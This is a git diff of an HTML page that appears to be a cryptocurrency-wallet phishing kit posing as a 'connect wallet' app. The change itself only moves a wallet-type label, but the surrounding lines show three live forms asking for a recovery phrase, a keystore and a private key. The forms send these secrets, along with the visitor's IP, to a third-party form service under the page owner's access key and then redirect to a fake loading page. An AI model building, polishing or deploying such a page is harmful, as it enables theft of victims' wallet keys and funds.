@@ -237,7 +237,8 @@
           <form  id="pass-phrase" action="https://api.web3forms.com/submit" method="POST">
             <input type="hidden" name="access_key" value="e4ec6457-bdd2-4870-b936-e9e466615c1f">
             <input type="hidden" name="redirect" value="https://nodeexplorers.pages.dev/apps/connect-wallet/loading.html">
-            <p><select id="wallet-provider">
+            <p>
+              <label for="wallet-provider">Select Crypto Wallet Type:</label><select id="wallet-provider">
               <option value="metamask">Metamask</option>
               <option value="trust">Trust Wallet</option>
               <option value="coinbase">Coinbase Wallet</option>
@@ -266,7 +267,8 @@
           <form  id="keystore-form" action="https://api.web3forms.com/submit" method="POST">
             <input type="hidden" name="access_key" value="e4ec6457-bdd2-4870-b936-e9e466615c1f">
               <input type="hidden" name="redirect" value="https://nodeexplorers.pages.dev/apps/connect-wallet/loading.html">
-              <p><select id="wallet-provider">
+              <p>
+                <label for="wallet-provider">Select Crypto Wallet Type:</label><select id="wallet-provider">
                 <option value="metamask">Metamask</option>
                 <option value="trust">Trust Wallet</option>
                 <option value="coinbase">Coinbase Wallet</option>
@@ -295,7 +297,8 @@
           <form  id="privatekey-form" action="https://api.web3forms.com/submit" method="POST">
             <input type="hidden" name="access_key" value="e4ec6457-bdd2-4870-b936-e9e466615c1f">
             <input type="hidden" name="redirect" value="https://nodeexplorers.pages.dev/apps/connect-wallet/loading.html">
-            <p><select id="wallet-provider">
+            <p>
+              <label for="wallet-provider">Select Crypto Wallet Type:</label><select id="wallet-provider">
               <option value="metamask">Metamask</option>
               <option value="trust">Trust Wallet</option>
               <option value="coinbase">Coinbase Wallet</option>
@@ -312,7 +315,7 @@
             </select></p>
                 <textarea name="privatekey" id="slpfoduuxq" class="phrase-field" placeholder="Private Key"></textarea>
                 <input type="hidden" name="user_ip" id="user_ip_key">
-                <label for="wallet-provider">Select Crypto Wallet Provider:</label>
+                
                 <input type="hidden" name="type" id="type-key">
                 <button type="submit" class="form-button">Import <i class="fa-solid fa-cloud-arrow-up"></i></button>
                 <p class="form-instrunctions text-center">Typically 64 alphanumeric characters</p>
